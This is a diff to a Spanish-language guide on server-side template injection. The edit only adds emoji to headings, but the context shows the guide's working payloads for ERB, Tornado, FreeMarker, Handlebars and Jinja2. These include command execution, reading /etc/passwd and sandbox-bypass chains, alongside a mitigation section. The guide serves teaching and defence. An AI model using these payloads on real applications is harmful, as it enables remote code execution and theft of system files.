@@ -26,7 +26,7 @@ La diferencia clave es si el input se trata como **dato** o como **código**.
 
 ***
 
-## 🧩  Motores de templates y su sintaxis
+## 🧩 Motores de templates y su sintaxis
 
 Cada motor usa una sintaxis distinta:
 
@@ -89,7 +89,7 @@ Los errores suelen revelar el motor:
 
 ## 💣 Explotación por motor
 
-### ERB (Ruby)
+### 💎 ERB (Ruby)
 
 ```ruby
 <%= `whoami` %>
@@ -97,7 +97,7 @@ Los errores suelen revelar el motor:
 <%= File.read("/etc/passwd") %>
 ```
 
-### Tornado (Python)
+### 🌪️ Tornado (Python)
 
 ```python
 {% import os %}{{os.popen('id').read()}}
@@ -109,7 +109,7 @@ Inyección en contexto existente:
 user.name}}{% import os %}{{os.popen('id').read()}
 ```
 
-### FreeMarker (Java)
+### ☕ FreeMarker (Java)
 
 ```java
 ${"freemarker.template.utility.Execute"?new()("id")}
@@ -123,7 +123,7 @@ Bypass de sandbox:
 ${ec.newInstance()("id")}
 ```
 
-### Handlebars (JavaScript)
+### 🤝 Handlebars (JavaScript)
 
 Ejemplo de cadena compleja para RCE usando prototipos:
 
@@ -137,7 +137,7 @@ Ejemplo de cadena compleja para RCE usando prototipos:
 {{/with}}
 ```
 
-### Django (Python)
+### 🐍 Django (Python)
 
 Django suele estar en sandbox:
 
@@ -155,13 +155,13 @@ No suele permitir RCE directo, pero sí fuga de información.
 
 Algunos motores limitan funciones peligrosas, pero se pueden evadir:
 
-### Traversal de clases (Java/Python)
+### 🔗 Traversal de clases (Java/Python)
 
 * Acceder a jerarquías de clases
 * Llegar a funciones peligrosas (`Runtime.exec`, `ProcessBuilder`)
 * Usar reflexión
 
-### Bypass en Jinja2
+### 🐍 Bypass en Jinja2
 
 ```python
 {{''.__class__.__mro__[2].__subclasses__()}}
@@ -196,12 +196,12 @@ Resultado: se elimina el archivo sensible.
 
 ## 🛡️ Prevención y mitigación
 
-### Usar templates sin lógica
+### 🏗️ Usar templates sin lógica
 
 * Motores como Mustache limitan ejecución
 * Separar lógica y presentación
 
-### Tratar input como datos
+### 📥 Tratar input como datos
 
 ```javascript
 # Seguro
@@ -211,19 +211,19 @@ render_template("page.html", name=user_input)
 render_template_string("Hello " + user_input)
 ```
 
-### Usar sandbox
+### 📦 Usar sandbox
 
 * Activar restricciones del motor
 * Limitar clases y funciones accesibles
 * Deshabilitar funciones peligrosas
 
-### Validación de entrada
+### ✅ Validación de entrada
 
 * Bloquear caracteres de templates (`{{`, `${`, `<%`)
 * Usar listas blancas
 * Sanitizar antes de procesar
 
-### Principio de mínimo privilegio
+### 🔑 Principio de mínimo privilegio
 
 * Ejecutar con permisos mínimos
 * No exponer objetos internos (`settings`, `config`)
